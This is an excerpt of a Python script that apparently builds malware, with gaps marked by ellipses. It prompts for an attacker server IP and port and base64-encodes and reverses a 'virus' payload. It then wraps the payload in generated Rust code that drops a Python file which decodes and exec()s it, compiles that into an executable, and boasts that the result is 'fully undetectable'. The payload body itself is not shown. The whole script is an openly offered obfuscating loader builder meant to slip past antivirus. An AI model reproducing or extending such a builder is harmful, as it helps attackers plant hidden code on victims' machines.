...
----BROUGHT TO YOU BY Shuvrosayar Das """)

IP=input("ENTER OPPS-SERVER IP ADDRESS: ")
PORT=input("ENTER OPPS-SERVER PORT: ")
...
virus_string_bytes = virus.encode("ascii")
b64_estring = base64.b64encode(virus_string_bytes)
dec_string = b64_estring.decode()

#print(base64.b64decode(dec_string)) Debugging Line
...
fn main() {
   let mut file = std::fs::File::create("viroos.py").expect("create failed");
   file.write_all("import base64\nstring='"""+dec_string[::-1]+"""'\nexec((base64.b64decode(string[::-1].encode()).decode()))".as_bytes()).expect("write failed");
...
file_handle=open("your_OPP.rs","w")
file_handle.write(tobewritten)
file_handle.close()


os.system("rustc your_OPP.rs")
print("Your Fully Undetectable Executable File Has Been Created Successfully!")
os.system("del your_OPP.rs")
print("Residual File Have Been Removed...")